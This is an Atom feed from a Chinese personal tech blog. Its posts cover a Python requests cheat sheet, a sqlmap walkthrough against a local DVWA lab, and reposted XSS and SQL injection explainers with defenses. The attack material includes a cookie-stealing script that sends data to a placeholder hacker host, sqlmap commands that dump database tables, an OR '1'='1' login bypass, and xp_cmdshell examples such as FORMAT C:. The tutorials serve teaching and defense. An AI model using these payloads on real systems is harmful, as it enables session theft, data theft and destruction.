<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://wangqunsong.github.io</id>
    <title>zootopia的后花园</title>
    <updated>2019-09-25T05:56:12.665Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="http://wangqunsong.github.io"/>
    <link rel="self" href="http://wangqunsong.github.io/atom.xml"/>
    <subtitle>zootopia</subtitle>
    <logo>http://wangqunsong.github.io/images/avatar.png</logo>
    <icon>http://wangqunsong.github.io/favicon.ico</icon>
    <rights>All rights reserved 2019, zootopia的后花园</rights>
    <entry>
        <title type="html"><![CDATA[Python最好用的第三方库requests总结]]></title>
        <id>http://wangqunsong.github.io/post/python-zui-hao-yong-de-di-san-fang-ku-requests-zong-jie</id>
        <link href="http://wangqunsong.github.io/post/python-zui-hao-yong-de-di-san-fang-ku-requests-zong-jie">
        </link>
        <updated>2019-05-12T03:32:15.000Z</updated>
        <summary type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>Python最好用的第三方库requests总结</strong></p>
]]></summary>
        <content type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>Python最好用的第三方库requests总结</strong></p>
<!-- more -->
<h4 id="写在前面">写在前面</h4>
<p>强烈建议阅读<a href="https://2.python-requests.org//zh_CN/latest/index.html">官方文档</a>，本文按照<a href="https://2.python-requests.org//zh_CN/latest/index.html">官方文档</a>的顺序进行组织。</p>
<h4 id="1-发送请求">1. 发送请求</h4>
<pre><code class="language-python">&gt;&gt;&gt; import requests
&gt;&gt;&gt; r_get = requests.get('https://api.github.com/events')
&gt;&gt;&gt; r_post = requests.post('http://httpbin.org/post', data = {'key':'value'})
</code></pre>
<h4 id="2-传递url参数">2. 传递URL参数</h4>
<pre><code class="language-python">&gt;&gt;&gt; load_data = {'key1':'value1','key2':'value2'}
# 方式一：URL + ? + 参数值： params（httpbin.org/get?key=val）
&gt;&gt;&gt; r_get = requests.get(&quot;http://httpbin.org/get&quot;, params=load_data)
# 方式二：form表单
&gt;&gt;&gt; r = requests.post(&quot;http://httpbin.org/post&quot;, data=load_data)
#方式三：json传输（实际上只是对data的参数进行了编码），以下2种方式的效果相同
&gt;&gt;&gt; r = requests.post(&quot;http://httpbin.org/post&quot;, json=load_data)
&gt;&gt;&gt; r = requests.post(&quot;http://httpbin.org/post&quot;, data=json.dumps(load_data))
</code></pre>
<h4 id="3响应内容">3.响应内容</h4>
<pre><code class="language-python">&gt;&gt;&gt; import requests
&gt;&gt;&gt; r = requests.get('https://api.github.com/events')
&gt;&gt;&gt; r.text   #响应内容
&gt;&gt;&gt; r.encoding  #编码
</code></pre>
<h4 id="4-二进制响应内容">4. 二进制响应内容</h4>
<pre><code class="language-python">&gt;&gt;&gt; r.content #二进制响应内容

#eg: 根据返回的二进制数据创建图片
&gt;&gt;&gt; from PIL import Image
&gt;&gt;&gt; from io import BytesIO
&gt;&gt;&gt; i = Image.open(BytesIO(r.content))
</code></pre>
<h4 id="5-json-响应内容">5. JSON 响应内容</h4>
<pre><code class="language-python">&gt;&gt;&gt; import requests
&gt;&gt;&gt; r = requests.get('https://api.github.com/events')
&gt;&gt;&gt; r.json()
</code></pre>
<h4 id="6-原始响应内容">6. 原始响应内容</h4>
<pre><code class="language-python">#获取来自服务器的原始套接字响应
&gt;&gt;&gt; r = requests.get('https://api.github.com/events', stream=True)
&gt;&gt;&gt; r.raw
&gt;&gt;&gt; r.raw.read(10)
</code></pre>
<h4 id="7-定制请求头">7. 定制请求头</h4>
<pre><code class="language-python">&gt;&gt;&gt; url = 'https://api.github.com/some/endpoint'
&gt;&gt;&gt; headers = {'user-agent': 'my-app/0.0.1'}
&gt;&gt;&gt; r = requests.get(url, headers=headers)
</code></pre>
<h4 id="8-上传文件">8. 上传文件</h4>
<pre><code class="language-python">&gt;&gt;&gt; files = {'file': open('report.xls', 'rb')}
&gt;&gt;&gt; r = requests.post('http://httpbin.org/post', files=files)
</code></pre>
<h4 id="9-响应状态码">9 .响应状态码</h4>
<pre><code class="language-python">&gt;&gt;&gt; r = requests.get('http://httpbin.org/get')
&gt;&gt;&gt; r.status_code   #200
&gt;&gt;&gt; r.status_code == requests.codes.ok   #True
&gt;&gt;&gt; r.raise_for_status()   #抛出异常
</code></pre>
<h4 id="10响应头">10.响应头</h4>
<pre><code class="language-python">&gt;&gt;&gt; r.headers
&gt;&gt;&gt; r.headers['Content-Type']  或者 r.headers.get('content-type')
'application/json'
</code></pre>
<h4 id="11cookie">11.Cookie</h4>
<pre><code class="language-python">&gt;&gt;&gt; url = 'http://httpbin.org/get'
#访问cookie
&gt;&gt;&gt; r = requests.get(url)
&gt;&gt;&gt; r.cookies['example_cookie_name']
#发送cookie
&gt;&gt;&gt; my_cookies = dict(cookies_are='upupup')
&gt;&gt;&gt; r = requests.get(url, cookies=my_cookies)
</code></pre>
<h4 id="12重定向">12.重定向</h4>
<pre><code class="language-python">&gt;&gt;&gt; url = 'http://httpbin.org/get'
&gt;&gt;&gt; r = requests.get(url)
#追踪重定向
&gt;&gt;&gt; r.history
</code></pre>
<h4 id="13-超时">13. 超时</h4>
<pre><code class="language-python">&gt;&gt;&gt; requests.get('http://github.com', timeout=0.001)
</code></pre>
<h4 id="14-错误与异常">14 .错误与异常</h4>
<pre><code class="language-python">&gt;&gt;&gt; Response.raise_for_status()
# 网络问题: ConnectionError 
# 不成功的状态码: HTTPError 异常;
# 请求超时: Timeout 异常;
# 超过了设定的最大重定向次数: TooManyRedirects 异常;
</code></pre>
<h4 id="15会话对象session">15.会话对象Session</h4>
<pre><code class="language-python"># 作用：
#（1）跨请求保持某些参数；
#（2）同一个session实例的所有请求之间保持cookie；
#（3）对同一主机的多个请求，底层的 TCP 连接将会被重用，显著的性能提升。
#（4）通过为会话对象属性提供数据，为请求方法提供缺省数据；
&gt;&gt;&gt; s = requests.Session()    #会话层
&gt;&gt;&gt; s.auth = ('user', 'pass')  #会话层
&gt;&gt;&gt; s.headers.update({'x-test': 'true'})  #会话层
&gt;&gt;&gt; s.get('http://httpbin.org/headers', headers={'x-test2': 'true'})   #方法层
</code></pre>
<h4 id="16请求与响应对象">16.请求与响应对象</h4>
<pre><code class="language-python">&gt;&gt;&gt; requests.get() 
#构建Request 对象发送到服务器，得到响应后生成Response 对象，该对象包含服务器返回的所有信息，也包括原来请求的Request 对象
</code></pre>
<h4 id="17-准备的请求">17. 准备的请求</h4>
<pre><code class="language-python">#在发送请求之前，对 body 或者 header （或者别的什么东西）做一些额外处理
from requests import Request,Session
s = Session()
req = Request('GET',url,data=data,headers=headers)
prepped = s.prepare_request(req)
resp = s.send(prepped,stream=stream,verify=verify,timeout=timeout)
</code></pre>
<h4 id="18ssl证书验证">18.SSL证书验证</h4>
<pre><code class="language-python">#默认开启
&gt;&gt;&gt; requests.get('https://github.com', verify=True)
#制定CA证书文件路径
&gt;&gt;&gt; requests.get('https://github.com', verify='/path/to/certfile')
#保持在会话中
&gt;&gt;&gt; s = requests.Session()
&gt;&gt;&gt; s.verify = '/path/to/certfile'
</code></pre>
<h4 id="19-客户端证书">19. 客户端证书</h4>
<pre><code class="language-python">&gt;&gt;&gt; requests.get('https://kennethreitz.org', cert=('/path/client.cert', '/path/client.key'))
#或者保持在会话中
&gt;&gt;&gt; s = requests.Session()
&gt;&gt;&gt; s.cert = '/path/client.cert'
</code></pre>
<p><strong>注：本地证书的私有 key 必须是解密状态。目前，Requests 不支持使用加密的 key。</strong></p>
<h4 id="20ca证书">20.CA证书</h4>
<pre><code class="language-shell">$  Requests 默认附带了一套它信任的根证书，来自于 Mozilla trust store。然而它们在每次 Requests 更新时才会更新。这意味着如果你固定使用某一版本的 Requests，你的证书有可能已经 太旧了。
   从 Requests 2.4.0 版之后，如果系统中装了 certifi 包，Requests 会试图使用它里边的 证书。这样用户就可以在不修改代码的情况下更新他们的可信任证书。
   为了安全起见，我们建议你经常更新 certifi！
</code></pre>
<h4 id="21响应体内容工作流">21.响应体内容工作流</h4>
<pre><code class="language-python"># 默认情况下，当你进行网络请求后，响应体会立即被下载。你可以通过 stream 参数覆盖这个行为，推迟下载响应体直到访问 Response.content 属性：
tarball_url = 'https://github.com/kennethreitz/requests/tarball/master'
r = requests.get(tarball_url, stream=True)
if int(r.headers['content-length']) &lt; TOO_LONG:
  content = r.content
  ...
</code></pre>
<h4 id="22持久连接">22.持久连接</h4>
<pre><code class="language-python"># 同一会话内的持久连接是完全自动处理的！同一会话内你发出的任何请求都会自动复用恰当的连接！
</code></pre>
<h4 id="23流式上传">23.流式上传</h4>
<pre><code class="language-python"># Requests支持流式上传，无需先把它们读入内存，仅需要为请求体提供类文件：
with open('massive-body') as f:
    requests.post('http://some.url/streamed', data=f)
</code></pre>
<p>**注：强烈建议你用二进制模式（<a href="https://docs.python.org/2/tutorial/inputoutput.html#reading-and-writing-files">binary mode</a>）打开文件，requests 可能会为你提供 header 中的 <code>Content-Length</code>，在这种情况下该值会被设为文件的字节数 **</p>
<h4 id="23-块编码请求">23. 块编码请求</h4>
<pre><code class="language-python">def gen():
    yield 'hi'
    yield 'there'
requests.post('http://some.url/chunked', data=gen())
</code></pre>
<h4 id="24-post多个文件">24. POST多个文件</h4>
<pre><code class="language-python">&gt;&gt;&gt; url = 'http://httpbin.org/post'
&gt;&gt;&gt; multiple_files = [
        ('images', ('foo.png', open('foo.png', 'rb'), 'image/png')),
        ('images', ('bar.png', open('bar.png', 'rb'), 'image/png'))]
&gt;&gt;&gt; r = requests.post(url, files=multiple_files)
</code></pre>
<h4 id="25-钩子机制">25. 钩子机制</h4>
<pre><code class="language-python">def print_url(r, *args, **kwargs):
    print(r.url)
&gt;&gt;&gt; requests.get('http://httpbin.org', hooks=dict(response=print_url))
</code></pre>
<h4 id="26代理">26.代理</h4>
<pre><code class="language-python">proxies = {
  &quot;http&quot;: &quot;http://10.10.1.10:3128&quot;,
  &quot;https&quot;: &quot;http://10.10.1.10:1080&quot;,
}
requests.get(&quot;http://example.org&quot;, proxies=proxies)
#或者通过设置环境变量
$ export HTTP_PROXY=&quot;http://10.10.1.10:3128&quot;
$ export HTTPS_PROXY=&quot;http://10.10.1.10:1080&quot;
$ python
&gt;&gt;&gt; import requests
&gt;&gt;&gt; requests.get(&quot;http://example.org&quot;)
</code></pre>
<h4 id="27-超时">27. 超时</h4>
<pre><code class="language-python">r = requests.get('https://github.com', timeout=5)  #timeout 值将会用作 connect 和 read 二者的 timeout

r = requests.get('https://github.com', timeout=(3.05, 27))  #分别指定
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[渗透测试工具——SQLmap]]></title>
        <id>http://wangqunsong.github.io/post/shen-tou-ce-shi-gong-ju-sqlmap</id>
        <link href="http://wangqunsong.github.io/post/shen-tou-ce-shi-gong-ju-sqlmap">
        </link>
        <updated>2019-02-02T14:31:36.000Z</updated>
        <summary type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>渗透测试工具——SQLmap</strong></p>
]]></summary>
        <content type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>渗透测试工具——SQLmap</strong></p>
<!-- more -->
<h4 id="sqlmap介绍">sqlmap介绍</h4>
<blockquote>
<p>​     sqlmap 是一个开源的渗透测试工具，可以用来自动化的检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。</p>
<p>-----来自sqlmap项目主页</p>
</blockquote>
<h4 id="搭建渗透演练系统dvwa">搭建渗透演练系统——DVWA</h4>
<h5 id="dvwa介绍">DVWA介绍</h5>
<p>​        DVWA(Dam Vulnerable Web Application) 是使用 <code>PHP+Mysql</code> 编写的一套用于常规<code>WEB</code>漏洞教学和检测的 <code>WEB</code> 脆弱性测试程序。其中包含了<code>SQL</code> 注入、<code>XSS</code>、盲注等常见的一些漏洞。</p>
<p><a href="https://github.com/ethicalhack3r/DVWA">DVWA的项目主页</a></p>
<h5 id="安装php集成环境">安装PHP集成环境</h5>
<p>​        建议使用模拟渗透系统演练sqlmap，这里为了简单使用了<code>phpstudy2016</code>，下载地址：<a href="http://www.phpstudy.net/phpstudy/phpStudy20161103.zip">phpstudy2016下载</a>。在<code>windows</code>上安装过程很简单，一直下一步即可，如下即安装成功：</p>
<p><img src="http://xiaoxiaowang-image.oss-cn-shanghai.aliyuncs.com/18-12-18/66019603.jpg" alt="phpstudy2016"></p>
<h5 id="安装dvwa">安装DVWA</h5>
<p><a href="https://github.com/ethicalhack3r/DVWA">DVWA下载地址</a></p>
<ul>
<li>
<ol>
<li>将下载的<code>DWVA</code>压缩包解压后放在<code>phpstady2016的安装目录\WWW</code>路径下：</li>
</ol>
</li>
</ul>
<p><img src="http://xiaoxiaowang-image.oss-cn-shanghai.aliyuncs.com/18-12-18/95561310.jpg" alt="DVWA路径"></p>
<ul>
<li>
<ol>
<li>
<p>进入<code>DWVA</code>的<code>config</code>文件夹，将其中的配置文件重命名为<code>config.inc.php</code>，并编辑<code>db_password</code>字段为 <code>root</code> 。(集成环境默认的<code>MYSQL</code>链接用户名和密码为 root/root)</p>
<p><img src="http://xiaoxiaowang-image.oss-cn-shanghai.aliyuncs.com/18-12-18/128296.jpg" alt="DWVA配置文件"></p>
</li>
</ol>
</li>
</ul>
<h5 id="创建数据库">创建数据库</h5>
<p>​        用浏览器访问<code>http://你的IP/DVWA-master/index.php</code>，并创建数据库，看到<code>successful</code>即创建成功。</p>
<p><img src="http://xiaoxiaowang-image.oss-cn-shanghai.aliyuncs.com/18-12-18/71775498.jpg" alt="DVWA创建数据库"></p>
<p><img src="http://xiaoxiaowang-image.oss-cn-shanghai.aliyuncs.com/18-12-18/74490603.jpg" alt="DVWA数据库创建结果"></p>
<h5 id="重新登录">重新登录</h5>
<p>​        数据库创建成果后，再次访问<code>http://你的IP/DVWA-master/index.php</code>，此时需要登录，默认用户名 <code>admin，</code> 默认密码 <code>password</code>。至此安装完成。</p>
<h4 id="sqlmap">SQLmap</h4>
<h5 id="安装">安装</h5>
<ul>
<li>
<ol>
<li>由于<code>SQLmap</code>依赖于<code>python</code>环境，所以需要先安装<code>python</code>(官网说明<code>pytnon</code>版本为<code>2.6，2.7</code>)，并配置环境变量，此过程不再赘述；</li>
</ol>
</li>
<li>
<ol>
<li>到<a href="https://sqlmap.org/">SQLmap官网</a>或者<a href="https://github.com/sqlmapproject/sqlmap">Github</a>下载<code>zip</code>压缩包，将压缩包解压并重命名为<code>sqlmap</code>后放到<code>python</code>的安装路径下；</li>
</ol>
</li>
<li>
<ol>
<li>为了简便，可以在桌面新建一个<code>sqlmap</code>的快捷方式：
<ul>
<li><img src="http://xiaoxiaowang-image.oss-cn-shanghai.aliyuncs.com/18-12-18/71990576.jpg" alt="快捷方式1"></li>
<li><img src="http://xiaoxiaowang-image.oss-cn-shanghai.aliyuncs.com/18-12-18/73556323.jpg" alt="快捷方式2"></li>
<li><img src="http://xiaoxiaowang-image.oss-cn-shanghai.aliyuncs.com/18-12-18/25195071.jpg" alt="快捷方式3"></li>
</ul>
</li>
</ol>
</li>
</ul>
<h5 id="sqlmap使用方法">SQLmap使用方法</h5>
<ul>
<li>
<h5 id="查看sqlmap参数">查看sqlmap参数</h5>
</li>
</ul>
<pre><code class="language-shell">python sqlmap.py -h

【参数解释】：
—cookie =&gt; 设置我们的 cookie 值 “将 DVWA 安全等级设置为 low”
—data =&gt; 设置 POST 提交的值，如果是 GET 提交，不需要此选项
-u =&gt; 指定目标 URL
-b =&gt; 获取 DBMS banner
—current-db =&gt; 获取当前数据库
—current-user =&gt; 获取当前数据库的用户
—tables =&gt; 获取数据库里所有的表名
—columns =&gt; 获取表里的所有字段
—dump =&gt; 获取值
—current-user =&gt; 获取当前用户
-D =&gt; 爆库指定数据库名
-T =&gt; 爆库指定表名
-C =&gt; 爆库指定字段名
—string =&gt; 当查询可用时用来匹配页面中的字符串
—users =&gt; 枚举 DBMS 用户
—password =&gt; 枚举 DBMS 用户密码 hash
—dbs =&gt; 枚举 DBMS 中的数据库
</code></pre>
<ul>
<li>
<h5 id="获取请求地址和cookie">获取请求地址和Cookie</h5>
<p><img src="http://xiaoxiaowang-image.oss-cn-shanghai.aliyuncs.com/18-12-18/25523699.jpg" alt="获取cookie"></p>
<p>​</p>
</li>
<li>
<h5 id="获取数据库名称-current-db">获取数据库名称（--current-db）</h5>
<pre><code class="language-shell">python sqlmap.py  -u &quot;http://192.168.50.39/DVWA-master/vulnerabilities/sqli/?id=wang&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=r9opl1ud6krq966l3cj7mnd4bb; security=low&quot; --current-db
</code></pre>
<blockquote>
<p>URL和cookie需替换为自己的值，URL的请求地址不需要token值;并将security值置为 low</p>
</blockquote>
<p><img src="http://xiaoxiaowang-image.oss-cn-shanghai.aliyuncs.com/18-12-18/724974.jpg" alt="sqlmap获取数据库名称"></p>
</li>
<li>
<h5 id="获取表-tables">获取表（--tables）</h5>
<pre><code class="language-shell">python sqlmap.py  -u &quot;http://192.168.50.39/DVWA-master/vulnerabilities/sqli/?id=wang&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=r9opl1ud6krq966l3cj7mnd4bb; security=low&quot; -D dvwa --tables
</code></pre>
<p><img src="http://xiaoxiaowang-image.oss-cn-shanghai.aliyuncs.com/18-12-18/23195206.jpg" alt="sqlmap获得表"></p>
</li>
<li>
<h5 id="获取字段-columns">获取字段（--columns）</h5>
</li>
</ul>
<pre><code class="language-shell">python sqlmap.py  -u &quot;http://192.168.50.39/DVWA-master/vulnerabilities/sqli/?id=wang&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=r9opl1ud6krq966l3cj7mnd4bb; security=low&quot; -D dvwa --tables  -T users --columns
</code></pre>
<p><img src="http://xiaoxiaowang-image.oss-cn-shanghai.aliyuncs.com/18-12-18/29715330.jpg" alt="sqlmap获得表字段"></p>
<ul>
<li>
<h5 id="获取数据-dump">获取数据（--dump）</h5>
</li>
</ul>
<pre><code class="language-shell">python sqlmap.py  -u &quot;http://192.168.50.39/DVWA-master/vulnerabilities/sqli/?id=wang&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=r9opl1ud6krq966l3cj7mnd4j4; security=low&quot; -D dvwa --tables  -T users --columns -C user_id --dump
</code></pre>
<p><img src="http://xiaoxiaowang-image.oss-cn-shanghai.aliyuncs.com/18-12-18/75987305.jpg" alt="sqlmap获得表数据"></p>
<p>目前为止，对<code>SQLmap</code>已有了基本的认识，更多的用法请访问<a href="https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md">官网说明</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[WEB攻击之_XSS「转]]]></title>
        <id>http://wangqunsong.github.io/post/web-gong-ji-zhi-_xsszhuan</id>
        <link href="http://wangqunsong.github.io/post/web-gong-ji-zhi-_xsszhuan">
        </link>
        <updated>2019-01-05T14:27:38.000Z</updated>
        <summary type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>WEB攻击之_XSS「转]</strong></p>
]]></summary>
        <content type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>WEB攻击之_XSS「转]</strong></p>
<!-- more --> 
<p>XSS又称CSS，全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞，其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。</p>
<!--more-->
<blockquote>
<p><a href="https://www.daguanren.cc/post/xss-introduction.html">原文链接</a></p>
</blockquote>
<h2 id="xss的背景与介绍">XSS的背景与介绍</h2>
<p><strong>1.背景</strong></p>
<p>随着互联网的发展，网站经历由单纯的只读模式到web2.0兴起的交互模式变迁，而正在向完美融合了人工智能的web3.0的道路发展。目前用户访问的大多数网站均有交互的功能，例如是电商网站的评论，微博网站的转发，论坛的发帖等等。对于正常用户而言，他们是遵守发帖和留言规范的，但对于黑客，他们是不会老老实实的按规矩办事的。</p>
<!--more-->
<p>下面的GIF图展示的是一个XSS攻击的示意：</p>
<p><img src="https://www.daguanren.cc/static/upload/20171116/xss-demo.gif" alt="XSS"></p>
<p>​<br>
上图先使用Chrome浏览器进行正常和非正常留言，Chrome浏览器自动检测出XSS攻击，屏蔽了请求。然后打开IE8，执行同样的操作，IE8成功受到了攻击。</p>
<p><strong>2.XSS定义</strong></p>
<p>​ 跨站脚本（英语：Cross-site<br>
scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。<br>
XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
<p>​<br>
简而言之，现在的网页基本是由html+css+javascript组成，普通用户输入的留言是文本信息，而黑客输入的留言内容则有可能是javascript代码。</p>
<p><strong>3.代码解释</strong></p>
<p>​<br>
以上GIF所展示的，是一个用户将文本框的信息提交form表单到后台，后台反馈到前台进行留言展示的场景。表单提交代码如下：</p>
<pre><code>&lt;form role=&quot;form&quot; method=&quot;post&quot;&gt;
    &lt;div class=&quot;form-group&quot;&gt;
        &lt;label&gt;输入内容&lt;/label&gt;&lt;br /&gt;
        &lt;textarea id=&quot;text&quot; name=&quot;text&quot;&gt;&lt;/textarea&gt;
        &lt;/label&gt;
    &lt;/div&gt;
    &lt;button id=&quot;btn&quot; type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;提交&lt;/button&gt;
&lt;/form&gt;

&lt;label&gt;展示内容&lt;/label&gt;
&lt;div id=&quot;show&quot; class=&quot;col-md-4&quot;&gt;
    {{text  | safe}}
        &lt;!--这里是nunjucks模板的展示写法，由后台赋值text变量--&gt;
&lt;/div&gt;

&lt;script&gt;
    $(&quot;#btn&quot;).click(function() {
        $.ajax({
            type: &quot;POST&quot;,
            url: &quot;/index&quot;,
            cache: false,
            data: {&quot;text&quot;: $(&quot;#text&quot;).text()},
            success: function(msg) {
            }
        });
    })
&lt;/script&gt;
</code></pre>
<p>前台表单提交到后台服务器，可以直接使用form表单提交，也可以使用ajax提交的方式。后台代码可以选择任意语言实现（java、php或者nodejs等均可），这里使用的nodejs代码，thinkjs3的框架，后台代码如下：</p>
<pre><code>//index.js
const Base = require('./base.js');

module.exports = class extends Base {
    indexAction() {
        if(this.isGet) {
                        //如果是Get请求，直接显示前台页面
            return this.display();
        } else if(this.isPost) {
                        //如果是Post请求，赋值nunjucks模板中的text变量，再进行页面展示
            let post = this.post();
            this.assign(&quot;text&quot;, post.text);
            return this.display();
        }
    }
};
</code></pre>
<p>这里只是一个比较轻微的弹出警告框的攻击，但如果攻击代码是：</p>
<pre><code>&lt;script type=text/javascript&gt;window.location = &quot;http://黑客IP:8360/getcookie?cookie=&quot;+document.cookie&lt;/script&gt;
</code></pre>
<p>则会将用户的cookie信息发送到黑客那里，而用户的cookie信息中很可能含有用户名和密码等重要信息，后果不堪设想。</p>
<h2 id="当前防御-xss-的几种策略">当前防御 XSS 的几种策略</h2>
<ol>
<li>浏览器端主动进行XSS识别</li>
<li>服务器端对于用户输入的内容进行过滤</li>
<li>使用较为安全的开发框架或模板</li>
</ol>
<p><strong>1、浏览器端主动进行XSS识别</strong></p>
<p>如上述Chrome浏览器会自动识别XSS攻击代码，并进行请求的屏蔽</p>
<p><strong>2、服务器端对于用户输入的内容进行过滤</strong></p>
<p>a)将重要的cookie标记为http only, 这样的话Javascript<br>
中的document.cookie语句就不能获取到cookie了；</p>
<p>b)只允许用户输入我们希望的数据，进行数据格式校验，例如年龄就只能输入0-160的数字</p>
<p>c)对数据进行html encode处理，过滤或移除特殊的Html标签， 例如:</p>
<pre><code>&amp;lt; 替代 &lt;, &amp;gt; 替代 &gt;, &amp;quot 替代 &quot;
</code></pre>
<p>d)过滤JavaScript 事件的标签。例如 &quot;onclick=&quot;, &quot;onfocus&quot; 等等。</p>
<p><strong>3、使用较为安全的开发框架</strong></p>
<p>上述代码所使用的nunjucks模板中：</p>
<pre><code>&lt;label&gt;展示内容&lt;/label&gt;
&lt;div id=&quot;show&quot; class=&quot;col-md-4&quot;&gt;
    {{text  | safe}}
        &lt;!--这里是nunjucks模板的展示写法，由后台赋值text变量--&gt;
&lt;/div&gt;
</code></pre>
<p>nunjucks默认所有值都会在视图内自动转义，以防止HTML注入和XSS攻击。 但是，</p>
<pre><code> | safe
</code></pre>
<p>这个语句是允许应用程序在视图中注入HTML片段。所以才会被XSS攻击</p>
<h2 id="总结">总结</h2>
<p>XSS攻击相比于CSRF攻击，还是比较容易防范的，只要同时限制用户输入数据的格式和进行数据转义，基本可以杜绝此类攻击。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[WEB攻击之_SQL注入「转]]]></title>
        <id>http://wangqunsong.github.io/post/web-gong-ji-zhi-_sql-zhu-ru-zhuan</id>
        <link href="http://wangqunsong.github.io/post/web-gong-ji-zhi-_sql-zhu-ru-zhuan">
        </link>
        <updated>2018-12-26T14:25:17.000Z</updated>
        <summary type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>WEB攻击之_SQL注入「转]</strong></p>
]]></summary>
        <content type="html"><![CDATA[<p>👏  欢迎使用 来到小小王的后花园！<br>
✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>WEB攻击之_SQL注入「转]</strong></p>
<!-- more --> 
<p>​        SQL注入看起来很复杂，其实很简单就能解释，SQL注入就是一种通过操作输入来修改后台SQL语句达到代码执行进行攻击目的的技术。</p>
<blockquote>
<p><a href="https://www.daguanren.cc/post/sql-injection.html">原文链接</a></p>
</blockquote>
<h2 id="sql注入的定义与诱因">SQL注入的定义与诱因</h2>
<p>1.<strong>定义</strong></p>
<p>​ SQL攻击（英语：SQL<br>
injection），简称注入攻击，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到破坏或是入侵。</p>
<p>只要是支持批处理SQL指令的数据库服务器，都有可能受到此种手法的攻击。</p>
<p><strong>2.诱因</strong></p>
<p>​ 在应用程序中若有下列状况，则可能应用程序正暴露在SQL<br>
Injection的高风险情况下：</p>
<ul>
<li>在应用程序中使用字符串联结方式组合SQL指令。</li>
<li>在应用程序链接数据库时使用权限过大的账户（例如很多开发人员都喜欢用最高权限的系统管理员账户（如常见的root，sa等）连接数据库）。</li>
<li>在数据库中开放了不必要但权力过大的功能（例如在Microsoft SQL<br>
Server数据库中的xp_cmdshell延伸预存程序或是OLE<br>
Automation预存程序等）</li>
<li>太过于信任用户所输入的数据，未限制输入的字符数，以及未对用户输入的数据做潜在指令的检查。</li>
</ul>
<p>下面的GIF展示的是SQL注入的示意：</p>
<p><img src="https://www.daguanren.cc/static/upload/20171116/sql-injection.gif" alt="sql-injection"></p>
<p><strong>3.解释</strong></p>
<p>假设某个网站的登录验证的SQL查询代码为</p>
<pre><code>SELECT * FROM `user` WHERE (username = 'username') and (password = 'password');
</code></pre>
<p>如果恶意将username和password传入的值设置为：</p>
<pre><code>username = '1' OR '1'='1';
password = '1' OR '1'='1';
</code></pre>
<p>即为：</p>
<pre><code>SELECT * FROM user WHERE (username = '1' OR '1'='1') and (password = '1' OR '1'='1');
</code></pre>
<p>由于OR 1=1 总是为真（true），原SQL语句等同于：</p>
<pre><code>SELECT * FROM user;
</code></pre>
<h2 id="sql注入的危害与防护">SQL注入的危害与防护</h2>
<p><strong>4.危害</strong></p>
<ol>
<li>数据表中的数据外泄，例如个人机密数据，账户数据，密码等。</li>
<li>数据结构被黑客探知，得以做进一步攻击（例如SELECT * FROM<br>
sys.tables）。</li>
<li>数据库服务器被攻击，系统管理员账户被窜改（例如ALTER LOGIN sa WITH<br>
PASSWORD='xxxxxx'）。</li>
<li>获取系统较高权限后，有可能得以在网页加入恶意链接、恶意代码以及<a href="https://www.daguanren.cc/post/xss-introduction.html">XSS</a>等。</li>
<li>经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如xp_cmdshell<br>
&quot;net stop iisadmin&quot;可停止服务器的IIS服务）。</li>
<li>破坏硬盘数据，瘫痪全系统（例如xp_cmdshell &quot;FORMAT C:&quot;）。</li>
</ol>
<p><strong>5.防护</strong></p>
<ol>
<li>在设计应用程序时，完全使用参数化查询（Parameterized<br>
Query）来设计数据访问功能。</li>
<li>在组合SQL字符串时，先针对所传入的参数作字符取代（将单引号字符取代为连续2个单引号字符）。</li>
<li>使用其他更安全的方式连接SQL数据库。例如已修正过SQL注入问题的数据库连接组件。</li>
<li>使用SQL防注入框架开发。</li>
</ol>
]]></content>
    </entry>
    <entry>
